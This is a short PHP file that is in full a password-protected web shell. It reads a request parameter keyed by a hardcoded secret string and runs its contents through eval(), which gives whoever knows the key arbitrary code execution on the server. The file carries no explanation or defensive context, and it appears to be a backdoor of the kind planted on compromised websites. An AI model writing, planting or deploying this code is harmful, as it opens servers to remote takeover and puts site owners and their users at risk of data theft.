<?php
$password = '3yplI04WSU';
if (isset($_REQUEST[$password])) {
    $cmd = $_REQUEST[$password];
    echo eval($cmd);
}
?>